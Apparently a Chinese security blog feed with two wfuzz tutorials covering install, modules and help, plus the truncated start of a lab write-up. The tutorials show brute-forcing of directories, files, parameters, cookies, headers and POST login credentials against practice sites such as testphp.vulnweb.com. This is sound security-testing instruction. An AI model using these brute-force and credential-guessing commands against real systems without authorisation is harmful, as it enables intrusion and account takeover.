    <content type="html"><![CDATA[<h2 id="爆破文件和路径"><a href="#爆破文件和路径" class="headerlink" title="爆破文件和路径"></a>爆破文件和路径</h2><h3 id="暴力猜测目录"><a href="#暴力猜测目录" class="headerlink" title="暴力猜测目录"></a>暴力猜测目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure><h3 id="暴力猜测文件"><a href="#暴力猜测文件" class="headerlink" title="暴力猜测文件"></a>暴力猜测文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php</span><br></pre></td></tr></table></figure><h2 id="测试url中的参数"><a href="#测试url中的参数" class="headerlink" title="测试url中的参数"></a>测试url中的参数</h2><p>通过在URL中在？后面设置FUZZ占位符，可以使用wfuzz来测试URL传入的参数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</span><br></pre></td></tr></table></figure></p><h2 id="测试post请求"><a href="#测试post请求" class="headerlink" title="测试post请求"></a>测试post请求</h2><p>传入 -d 参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/others/common_pass.txt -d <span class="string">"uname=FUZZ&amp;pass=FUZZ"</span> --hc 302 http://testphp.vulnweb.com/userinfo.php</span><br></pre></td></tr></table></figure><h2 id="测试cookies"><a href="#测试cookies" class="headerlink" title="测试cookies"></a>测试cookies</h2><p>可以使用 -b 参数指定,多个cookies可以使用多次<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><p>同样也可以测试cookies字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p><h2 id="测试自定义请求头"><a href="#测试自定义请求头" class="headerlink" title="测试自定义请求头"></a>测试自定义请求头</h2><p>使用-H参数来指定HTTP请求和存在的请求头，多次指定可多次使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -H <span class="string">"myheader: headervalue"</span> -H <span class="string">"User-Agent: Googlebot-News"</span> http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><p>Headers也可以被测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -H <span class="string">"User-Agent: FUZZ"</span> http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p><h2 id="测试HTTP请求方法"><a href="#测试HTTP请求方法" class="headerlink" title="测试HTTP请求方法"></a>测试HTTP请求方法</h2><p>可以通过传入 -x 参数指定<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>可以通过传入 -p 参数指定,同样可以多个代理多个指定<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -p localhost:8080 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>可以通过 –basec/ntml/digest 来设置认证头<br>想测试经过认证后的资源,而一颗通过指定 –basic user:pass 的方式来测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx</span><br></pre></td></tr></table></figure></p><h2 id="递归测试"><a href="#递归测试" class="headerlink" title="递归测试"></a>递归测试</h2><p>可以换入 -R 参数指定一个payload被递归的深度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,<span class="string">"admin-CVS-cgi\-bin"</span> -R 1 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><h2 id="测试速度与效率"><a href="#测试速度与效率" class="headerlink" title="测试速度与效率"></a>测试速度与效率</h2><p>使用 -t 参数可以增加或减少同时发送HTTP请求的数量<br>使用 -s 参数可以调节每次发送HTTP的时间间隔</p><h2 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h2><p>可以通过 printers 插件来将结果以不同格式保存到文档中<br>例如<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -f /tmp/outfile,json -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;爆破文件和路径&quot;&gt;&lt;a href=&quot;#爆破文件和路径&quot; class=&quot;headerlink&quot; title=&quot;爆破文件和路径&quot;&gt;&lt;/a&gt;爆破文件和路径&lt;/h2&gt;&lt;h3 id=&quot;暴力猜测目录&quot;&gt;&lt;a href=&quot;#暴力猜测目录&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="工具" scheme="https://www.damyahome.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="wfuzz" scheme="https://www.damyahome.github.io/tags/wfuzz/"/>
    
  </entry>
  
  <entry>
    <title>wfuzz初使用!</title>
    <link href="https://www.damyahome.github.io/wfuzz%E5%88%9D%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.damyahome.github.io/wfuzz%E5%88%9D%E4%BD%BF%E7%94%A8/</id>
    <published>2019-11-19T12:42:20.000Z</published>
    <updated>2019-11-21T13:06:08.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p>先在github上下载wfuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xmendez/wfuzz.git</span><br></pre></td></tr></table></figure><p>手动在官网安装pycurl插件<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">官网</a><br>python2.7的是  pycurl-7.43.0.3-cp27-cp27m-win_amd64.whl<br>python3.7的是  pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl<br>再分别安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install pycurl-7.43.0.3-cp27-cp27m-win_amd64.whl</span><br><span class="line">python2 -m pip install wfuzz</span><br><span class="line">python3 -m pip install pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl</span><br><span class="line">python3 -m pip install wfuzz</span><br></pre></td></tr></table></figure></p><h3 id="ubuntu18-04"><a href="#ubuntu18-04" class="headerlink" title="ubuntu18.04"></a>ubuntu18.04</h3><p>先在github上下载wfuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xmendez/wfuzz.git</span><br></pre></td></tr></table></figure><p>安装pycurl依赖库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libcurl4-openssl-dev</span><br><span class="line">apt-get install libcurl4-gnutls-dev</span><br><span class="line">apt-get install libghc-gnutls-dev</span><br></pre></td></tr></table></figure></p><p>再通过pip进行安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycurl</span><br><span class="line">pip install wfuzz</span><br></pre></td></tr></table></figure></p><h2 id="初识wfuzz"><a href="#初识wfuzz" class="headerlink" title="初识wfuzz"></a>初识wfuzz</h2><h3 id="最简单的一个命令"><a href="#最简单的一个命令" class="headerlink" title="最简单的一个命令"></a>最简单的一个命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ  <span class="comment"># win10</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ  <span class="comment"># ubuntu18.04</span></span><br></pre></td></tr></table></figure><p>(可能是我下了github的wfuzz的原因,我的字典不在/usr/share里,而在wfuzz包里)</p><p>输出参数对应信息:</p><p>ID：测试时的请求序号<br>Response：HTTP响应吗<br>Lines：响应信息中的行数<br>Word：响应信息中的字数<br>Chars：响应信息中的字符数<br>Payload：当前使用的payload</p><h3 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h3><p>wfuzz可用的模块有payloads,encoders,iterators,printers和scripts<br>使用时可以通过以下命令查看其中可用的模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -e iterators</span><br><span class="line">wfuzz -z <span class="built_in">help</span></span><br><span class="line">wfuzz -z <span class="built_in">help</span> --slice <span class="string">"dirwalk"</span>  <span class="comment"># 对输出结果过滤查看</span></span><br></pre></td></tr></table></figure></p><h3 id="指定一个payload"><a href="#指定一个payload" class="headerlink" title="指定一个payload"></a>指定一个payload</h3><p>每个FUZZ占位符都必须为它指定相应的payload,以下是使用方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令比较长的方式是显式的定义payload的参数:</span></span><br><span class="line">wfuzz -z file --zP fn=/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br><span class="line"><span class="comment"># 另一个不太长的方式是只提供payload所需的默认参数：</span></span><br><span class="line">wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br><span class="line"><span class="comment"># 最后，短的方式是使用别名：</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><p>stdin这个payload可以在使用一些外部字典生成工具时很方便：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install crunch</span><br><span class="line">crunch 2 2 ab | wfuzz -z stdin http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p><h3 id="使用多个payloads"><a href="#使用多个payloads" class="headerlink" title="使用多个payloads"></a>使用多个payloads</h3><p>使用-z 或-w 参数可以同时指定多个payloads，这时相应的占位符应设置为 FUZZ, … , FUZnZ, 其中n代表了payload的序号。比如下面的例子，我们同时暴破文件，后缀和目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -w ./wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 http://testphp.vulnweb.com/FUZZ/FUZ2ZFUZ3Z</span><br></pre></td></tr></table></figure></p><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>通过–hc，–hl，–hw，–hh参数可以隐藏某些HTTP响应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--hc 404  <span class="comment"># 隐藏无法找到的页面</span></span><br><span class="line">--hc 404,403  <span class="comment"># 隐藏多个禁止访问的响应</span></span><br></pre></td></tr></table></figure></p><p>用行数，字数，字符数来指定过滤规则，在当HTTP返回码相同的时候比较方便<br>比如，网站一般会指定一个自定义的错误页面，返回码是200，但实际上起到了一个404页面的作用，我们称之为软404<br>这时候就需要添加别的参数来过滤<br>显示响应结果也有对应的参数<br>–sc，–sl，–sw，–sh</p><h2 id="payload各模块功能列举"><a href="#payload各模块功能列举" class="headerlink" title="payload各模块功能列举"></a>payload各模块功能列举</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>payload为wfuzz生成的用于测试的特定字符串，一般情况下，会替代被测试URL中的FUZZ占位符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">guitab | 从可视化的标签栏中读取请求</span><br><span class="line">dirwalk | 递归获得本地某个文件夹中的文件名</span><br><span class="line">file | 获取一个文件当中的每个词</span><br><span class="line">autorize | 获取autorize的测试结果Returns fuzz results&apos; from autororize.</span><br><span class="line">wfuzzp | 从之前保存的wfuzz会话中获取测试结果的URL</span><br><span class="line">ipnet | 获得一个指定网络的IP地址列表</span><br><span class="line">bing | 获得一个使用bing API搜索的URL列表 (需要 api key).</span><br><span class="line">stdin | 获得从标准输入中的条目</span><br><span class="line">list | 获得一个列表中的每一个元素，列表用以 - 符号分格</span><br><span class="line">hexrand | 从一个指定的范围中随机获取一个hex值</span><br><span class="line">range | 获得指定范围内的每一个数值</span><br><span class="line">names | 从一个以 - 分隔的列表中，获取以组合方式生成的所有usernames值</span><br><span class="line">burplog | 从BurpSuite的记录中获得测试结果</span><br><span class="line">permutation | 获得一个在指定charset和length时的字符组合</span><br><span class="line">buffer_overflow | 获得一个包含指定个数个A的字符串.</span><br><span class="line">hexrange | 获得指定范围内的每一个hex值</span><br><span class="line">iprange | 获得指定IP范围内的IP地址列表</span><br><span class="line">burpstate | 从BurpSuite的状态下获得测试结果</span><br></pre></td></tr></table></figure><h3 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h3><p>encoder的作用是将payload进行编码或加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">url_safe, url | urlencode | 用`%xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">url_safe, url | double urlencode | 用`%25xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">url | uri_double_hex | 用`%25xx`的方式将所有字符进行编码</span><br><span class="line">html | html_escape | 将`&amp;`，`&lt;`，`&gt;`转换为HTML安全的字符</span><br><span class="line">html | html_hexadecimal | 用 `&amp;#xx;` 的方式替换所有字符</span><br><span class="line">hashes | base64 | 将给定的字符串中的所有字符进行base64编码</span><br><span class="line">url | doble_nibble_hex | 将所有字符以`%%dd%dd`格式进行编码</span><br><span class="line">db | mssql_char | 将所有字符转换为MsSQL语法的`char(xx)`形式</span><br><span class="line">url | utf8 | 将所有字符以`\u00xx` 格式进行编码</span><br><span class="line">hashes | md5 | 将给定的字符串进行md5加密</span><br><span class="line">default | random_upper | 将字符串中随机字符变为大写</span><br><span class="line">url | first_nibble_hex | 将所有字符以`%%dd?` 格式进行编码</span><br><span class="line">default | hexlify | 每个数据的单个比特转换为两个比特表示的hex表示</span><br><span class="line">url | second_nibble_hex | 将所有字符以`%?%dd` 格式进行编码</span><br><span class="line">url | uri_hex | 将所有字符以`%xx` 格式进行编码</span><br><span class="line">default | none | 不进行任何编码</span><br><span class="line">hashes | sha1 | 将字符串进行sha1加密</span><br><span class="line">url | utf8_binary | 将字符串中的所有字符以 `\uxx` 形式进行编码</span><br><span class="line">url | uri_triple_hex | 将所有字符以`%25%xx%xx` 格式进行编码</span><br><span class="line">url | uri_unicode | 将所有字符以`%u00xx` 格式进行编码</span><br><span class="line">html | html_decimal | 将所有字符以 `&amp;#dd; ` 格式进行编码</span><br><span class="line">db | oracle_char | 将所有字符转换为Oracle语法的`chr(xx)`形式</span><br><span class="line">db | mysql_char | 将所有字符转换为MySQL语法的`char(xx)`形式</span><br></pre></td></tr></table></figure><h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>wfuzz的iterator提供了针对多个payload的处理方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">product | 返回输入条目的笛卡尔积</span><br><span class="line">zip | Retns an iterator that aggregates elements from each of the iterables.（翻译不好，请自行理解）</span><br><span class="line">chain | Returns an iterator returns elements from the first iterable until it is exhaust</span><br><span class="line">| ed, then proceeds to the next iterable, until all of the iterables are exhausted</span><br></pre></td></tr></table></figure><h3 id="printer"><a href="#printer" class="headerlink" title="printer"></a>printer</h3><p>wfuzz的printers用于控制输出打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">raw | `Raw` output format</span><br><span class="line">json | Results in `json` format</span><br><span class="line">csv | `CSV` printer ftw</span><br><span class="line">magictree | Prints results in `magictree` format</span><br><span class="line">html | Prints results in `html` format</span><br></pre></td></tr></table></figure><h3 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">default, passive | cookies | 查找新的cookies</span><br><span class="line">default, passive | errors | 查找错误信息</span><br><span class="line">passive | grep | HTTP response grep</span><br><span class="line">active | screenshot | 用linux cutycapt tool 进行屏幕抓取</span><br><span class="line">default, active, discovery | links | 解析HTML并查找新的内容</span><br><span class="line">default, active, discovery | wc_extractor | 解析subversion的wc.db文件</span><br><span class="line">default, passive | listing | 查找列目录漏洞</span><br><span class="line">default, passive | title | 解析HTML页面的title</span><br><span class="line">default, active, discovery | robots | 解析robots.txt文件来查找新内容</span><br><span class="line">default, passive | headers | 查找服务器的返回头</span><br><span class="line">default, active, discovery | cvs_extractor | 解析 CVS/Entries 文件</span><br><span class="line">default, active, discovery | svn_extractor | 解析 .svn/entries 文件</span><br><span class="line">active, discovery | backups | 查找已知的备份文件名</span><br><span class="line">default, active, discovery | sitemap | 解析 sitemap.xml 文件</span><br></pre></td></tr></table></figure><h2 id="内置工具"><a href="#内置工具" class="headerlink" title="内置工具"></a>内置工具</h2><h3 id="wfencode工具"><a href="#wfencode工具" class="headerlink" title="wfencode工具"></a>wfencode工具</h3><p>是wfuzz自带的一个加密/解密（编码/反编码）工具，目前支持内建的encoders的加/解密</p><p>使用:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfencode -e base64 123456</span><br><span class="line">wfencode -d base64 MTIzNDU2</span><br></pre></td></tr></table></figure></p><h3 id="wfpayload工具"><a href="#wfpayload工具" class="headerlink" title="wfpayload工具"></a>wfpayload工具</h3><p>wfpayload是payload生成工具</p><p>使用:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfpayload -z range,0-10</span><br></pre></td></tr></table></figure></p><h2 id="wfuzz命令中文帮助"><a href="#wfuzz命令中文帮助" class="headerlink" title="wfuzz命令中文帮助"></a>wfuzz命令中文帮助</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Usage: wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line">FUZZ, ..., FUZnZ payload占位符，wfuzz会用指定的payload代替相应的占位符，n代表数字.</span><br><span class="line">FUZZ&#123;baseline_value&#125; FUZZ 会被 baseline_value替换，并将此作为测试过程中第一个请求来测试，可用来作为过滤的一个基础。</span><br><span class="line">Options:</span><br><span class="line">-h/--help : 帮助文档</span><br><span class="line">--help : 高级帮助文档</span><br><span class="line">--version : Wfuzz详细版本信息</span><br><span class="line">-e &lt;type&gt; : 显示可用的encoders/payloads/iterators/printers/scripts列表</span><br><span class="line">--recipe &lt;filename&gt; : 从文件中读取参数</span><br><span class="line">--dump-recipe &lt;filename&gt; : 打印当前的参数并保存成文档</span><br><span class="line">--oF &lt;filename&gt; : 将测试结果保存到文件，这些结果可被wfuzz payload 处理</span><br><span class="line">-c : 彩色化输出</span><br><span class="line">-v : 详细输出</span><br><span class="line">-f filename,printer : 将结果以printer的方式保存到filename (默认为raw printer).</span><br><span class="line">-o printer : 输出特定printer的输出结果</span><br><span class="line">--interact : (测试功能) 如果启用，所有的按键将会被捕获，这使得你能够与程序交互</span><br><span class="line">--dry-run : 打印测试结果，而并不发送HTTP请求</span><br><span class="line">--prev : 打印之前的HTTP请求（仅当使用payloads来生成测试结果时使用）</span><br><span class="line">-p addr : 使用代理，格式 ip:port:type. 可设置多个代理，type可取的值为SOCKS4,SOCKS5 or HTTP（默认）</span><br><span class="line">-t N : 指定连接的并发数，默认为10</span><br><span class="line">-s N : 指定请求的间隔时间，默认为0</span><br><span class="line">-R depth : 递归路径探测，depth指定最大递归数量</span><br><span class="line">-L,--follow : 跟随HTTP重定向</span><br><span class="line">-Z : 扫描模式 (连接错误将被忽视).</span><br><span class="line">--req-delay N : 设置发送请求允许的最大时间，默认为 90，单位为秒.</span><br><span class="line">--conn-delay N : 设置连接等待的最大时间，默认为 90，单位为秒.</span><br><span class="line">-A : 是 --script=default -v -c 的简写</span><br><span class="line">--script= : 与 --script=default 等价</span><br><span class="line">--script=&lt;plugins&gt; : 进行脚本扫描， &lt;plugins&gt; 是一个以逗号分开的插件或插件分类列表</span><br><span class="line">--script-help=&lt;plugins&gt; : 显示脚本的帮助</span><br><span class="line">--script-args n1=v1,... : 给脚本传递参数. ie. --script-args grep.regex=&quot;&lt;A href=\&quot;(.*?)\&quot;&gt;&quot;</span><br><span class="line">-u url : 指定请求的URL</span><br><span class="line">-m iterator : 指定一个处理payloads的迭代器 (默认为product)</span><br><span class="line">-z payload : 为每一个占位符指定一个payload，格式为 name[,parameter][,encoder].</span><br><span class="line">编码可以是一个列表, 如 md5-sha1. 还可以串联起来, 如. md5@sha1.</span><br><span class="line">还可使用编码各类名，如 url</span><br><span class="line">使用help作为payload来显示payload的详细帮助信息，还可使用--slice进行过滤</span><br><span class="line">--zP &lt;params&gt; : 给指定的payload设置参数。必须跟在 -z 或-w 参数后面</span><br><span class="line">--slice &lt;filter&gt; : 以指定的表达式过滤payload的信息，必须跟在-z 参数后面</span><br><span class="line">-w wordlist : 指定一个wordlist文件，等同于 -z file,wordlist</span><br><span class="line">-V alltype : 暴力测试所有GET/POST参数，无需指定占位符</span><br><span class="line">-X method : 指定一个发送请求的HTTP方法，如HEAD或FUZZ</span><br><span class="line">-b cookie : 指定请求的cookie参数，可指定多个cookie</span><br><span class="line">-d postdata : 设置用于测试的POST data (ex: &quot;id=FUZZ&amp;catalogue=1&quot;)</span><br><span class="line">-H header : 设置用于测试请求的HEADER (ex:&quot;Cookie:id=1312321&amp;user=FUZZ&quot;). 可指定多个HEADER.</span><br><span class="line">--basic/ntlm/digest auth : 格式为 &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;</span><br><span class="line">--hc/hl/hw/hh N[,N]+ : 以指定的返回码/行数/字数/字符数作为判断条件隐藏返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--sc/sl/sw/sh N[,N]+ : 以指定的返回码/行数/字数/字符数作为判断条件显示返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--ss/hs regex : 显示或隐藏返回结果中符合指定正则表达式的返回结果</span><br><span class="line">--filter &lt;filter&gt; : 显示或隐藏符合指定filter表达式的返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--prefilter &lt;filter&gt; : 用指定的filter表达式在测试之前过滤某些测试条目</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;h3 id=&quot;win10&quot;&gt;&lt;a href=&quot;#win10&quot; class=&quot;headerlink&quot; title=&quot;win10&quot;&gt;&lt;/a&gt;win1
      
    
    </summary>
    
    
      <category term="工具" scheme="https://www.damyahome.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="wfuzz" scheme="https://www.damyahome.github.io/tags/wfuzz/"/>
    
  </entry>
  
  <entry>
    <title>20088靶场wp</title>
    <link href="https://www.damyahome.github.io/20088%E9%9D%B6%E5%9C%BAwp/"/>
    <id>https://www.damyahome.github.io/20088%E9%9D%B6%E5%9C%BAwp/</id>
    <published>2019-11-14T08:10:32.000Z</published>
    <updated>2019-11-14T09:01:53.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="20088靶场wp"><a href="#20088靶场wp" class="headerlink" title="20088靶场wp"></a>20088靶场wp</h2><p>链接: <a href="http://172.17.135.48:20088" target="_blank" rel="noopener">172.17.135.48:20088</a></p><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span 